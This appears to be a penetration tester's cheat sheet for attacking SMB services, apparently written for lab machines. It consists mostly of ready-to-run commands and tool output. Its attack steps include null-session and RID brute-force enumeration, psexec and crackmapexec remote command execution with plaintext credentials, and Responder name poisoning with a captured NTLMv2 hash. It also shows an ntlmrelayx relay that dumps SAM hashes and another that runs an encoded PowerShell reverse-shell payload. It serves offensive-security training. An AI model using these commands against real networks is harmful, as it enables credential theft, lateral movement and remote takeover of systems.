#### Ports
* TCP 139 and UDP 137, 138
* TCP 445
#### Anon auth (null-session)
Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`
```bash
# -N - use null session
smbclient -N -L //10.10.14.222/
```
#### Alternative to smbclient
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
```

```bash
python psexec.py username:password@hostIP
```
##### Enumerate SMB users
 ```bash
 lookupsid.py guest@10.10.11.222 -no-pass
 ```
#### smbmap
```bash
# list shared and permissions
smbmap -H 10.10.216.209

# browse files and directories recursive
smbmap -H 10.10.216.209 -r

# download
smbmap -H 10.129.14.128 --download "notes\note.txt"
# upload 
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
#### SMBclient
```bash
smbclient //10.10.216.209/anonymous

get logs/log1.txt
put local.txt
```
auth as user:
```bash
smbclient -U milesdyson //10.10.216.209/milesdyson
```
list shared folders:
```bash
smbclient -L \\\\10.10.18.79
```
connect and download:
```bash
λ kali ~ → smbclient  \\\\10.10.18.79\\Users
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> get gakeeper.exe
```
footprint samba
```shell
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
#### RPCclient - Enumeration
```shell
rpcclient -U "" 10.129.14.128

# null-session
rpcclient -U'%' 10.10.110.17
```

|                           |                                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |
| querygroup<br>            |                                                                    |
|                           |                                                                    |
|                           |                                                                    |
#### ENUM4LINUX 
```bash
./enum4linux-ng.py 10.129.14.128 -A -C
```
#### [[Brute Force]] User RIDs
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
#### Other related tools:
https://github.com/SecureAuthCorp/impacket [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).
https://github.com/byt3bl33d3r/CrackMapExec
# Mount share folder
```bash
sudo mount -t cifs -o username=htb-student,password=Academy_WinFun! //ipaddoftarget/"Company Data" /home/user/Desktop/
```
```bash
sudo apt-get install cifs-utils
```
# RCE
* Impacket PsExec
* Impacket SMBExec -  similar approach to PsExec without using RemComSvc.
* Impacket atexec
* CrackMapExec - includes an implementation of smbexec and atexec.
* Metasploit PsExec
#### #Impacket:
```bash
impacket-psexec administrator:'Password123!'@10.10.110.17

C:\Windows\system32>whoami && hostname
```
The same options apply to impacket-smbexec and impacket-atexec.
#### #CrackMapExec
```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Enumerating Logged-on Users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Forced Authentication Attacks
We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).
```bash
sudo responder -I ens33

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B5
```
If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py or Responder MultiRelay.py https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py Let us see an example using impacket-ntlmrelayx.

First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
```basg
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
<SNIP>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
```
Create reverse shell:
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <reverse shell payload in base64>'
```